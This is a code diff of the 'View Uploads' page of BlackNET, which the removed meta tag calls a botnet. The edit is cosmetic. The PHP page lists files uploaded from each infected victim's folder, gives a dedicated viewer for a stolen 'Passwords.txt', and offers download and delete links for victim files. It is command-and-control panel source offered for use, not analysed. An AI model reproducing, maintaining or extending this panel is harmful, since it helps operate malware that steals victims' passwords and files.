@@ -28,30 +28,12 @@ function formatBytes($bytes, $precision = 2) {
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <link rel="shortcut icon" href="favico.png">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Botnet Coded By Black.Hacker">
-    <meta name="author" content="Black.Hacker">
+  <?php include_once 'components/meta.php'; ?>
 	<title>BlackNET - View Uploads</title>
 	<?php include_once 'components/css.php'; ?>
 	<link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
-    <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
-    <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
-    <style type="text/css">
-      .sticky{
-        display: -webkit-box;
-        display: -ms-flexbox;
-        background-color: #e9ecef;
-        height: 80px;
-        right: 0;
-        bottom: 0; 
-        position: absolute;
-        display: flex;
-        width: 100%;
-        flex-shrink: none;
-      }
-    </style>
+  <link href="asset/vendor/responsive/css/responsive.dataTables.css" rel="stylesheet">
+  <link href="asset/vendor/responsive/css/responsive.bootstrap4.css" rel="stylesheet">
 </head>
 <body id="page-top">
 	<?php include_once 'components/header.php'; ?>
@@ -108,11 +90,11 @@ function formatBytes($bytes, $precision = 2) {
                             <td><?php echo md5_file("upload/$vicID/$file"); ?></td>
                             <td>
                             <?php if($file == "Passwords.txt"): ?>
-                              <a href="<?php echo("viewpasswords.php?vicid=$vicID") ?>"  class="fas fa-download"></a>
+                              <a href="<?php echo("viewpasswords.php?vicid=$vicID") ?>"  class="fas fa-download text-decoration-none"></a>
                             <?php else: ?>
-                              <a href="<?php echo("upload/$vicID/$file") ?>" class="fas fa-download"></a>
+                              <a href="<?php echo("upload/$vicID/$file") ?>" class="fas fa-download text-decoration-none"></a>
                             <?php endif; ?>
-                              <a href="rmfile.php?fname=<?php echo($file) ?>&vicid=<?php echo($vicID) ?>" class="fas fa-trash-alt"></a>
+                              <a href="rmfile.php?fname=<?php echo($file) ?>&vicid=<?php echo($vicID) ?>" class="fas fa-trash-alt text-decoration-none"></a>
                             </td>
                           </tr>
                             <?php $i++; ?>
